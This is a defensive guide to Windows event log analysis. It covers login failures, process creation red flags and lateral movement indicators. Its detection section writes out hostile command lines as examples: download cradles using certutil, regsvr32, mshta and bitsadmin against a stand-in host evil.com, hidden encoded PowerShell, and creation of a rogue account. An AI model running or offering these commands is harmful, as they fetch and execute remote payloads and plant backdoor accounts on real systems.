# Windows Log Analysis Guide

## Log Locations

```
Security Log   → C:\Windows\System32\winevt\Logs\Security.evtx
System Log     → C:\Windows\System32\winevt\Logs\System.evtx
Application    → C:\Windows\System32\winevt\Logs\Application.evtx
PowerShell     → C:\Windows\System32\winevt\Logs\
                 Microsoft-Windows-PowerShell%4Operational.evtx
Sysmon         → C:\Windows\System32\winevt\Logs\
                 Microsoft-Windows-Sysmon%4Operational.evtx
```

## Analyzing Login Events (4624/4625)

A single 4625 means nothing. Context is everything.

```
Investigate:
├── How many failures?
├── Over what time window?
├── Same account or different accounts?
├── Same source IP or distributed?
└── Was there a 4624 (success) after the failures?

Brute force pattern:
4625 at 03:14:01 from 45.33.32.156 for "admin"
4625 at 03:14:02 from 45.33.32.156 for "admin"
4625 at 03:14:03 from 45.33.32.156 for "admin"
... (100 more failures)
4624 at 03:14:50 from 45.33.32.156 for "admin"  ← COMPROMISED
```

## Process Creation Analysis (4688)

The full command line tells the story. Look for:

```
RED FLAGS in CommandLine field:
─────────────────────────────────────────────────────────────
powershell -EncodedCommand <base64>    → Encoded payload
powershell -w hidden -c ...            → Hidden execution
cmd /c "net user hacker P@ss /add"    → Account creation
certutil -urlcache -f http://evil.com → Certutil download cradle
regsvr32 /s /n /u /i:http://evil.com  → Regsvr32 living-off-the-land
mshta http://evil.com/payload.hta     → MSHTA payload
wscript //E:JScript payload.txt       → Script execution
bitsadmin /transfer job http://evil.com/malware C:\malware.exe

SUSPICIOUS PARENT→CHILD relationships:
winword.exe → cmd.exe         (Office macro)
excel.exe   → powershell.exe  (Office macro)
outlook.exe → cmd.exe         (Email attachment)
explorer.exe → powershell.exe -EncodedCommand  (Suspicious)
```

## Detecting Lateral Movement

```
Pass-the-Hash indicators:
- Event 4624, LogonType=3 (Network)
- Source IP different from user's usual workstation
- NtLmSsp authentication package in 4624

PsExec indicators:
- Event 7045: Service "PSEXESVC" installed
- Event 4624, LogonType=3 from attacker IP
- Process 4688: psexesvc.exe spawning cmd.exe

WMI lateral movement:
- Event 4624, LogonType=3
- Process 4688: WmiPrvSE.exe spawning cmd.exe or powershell.exe
```
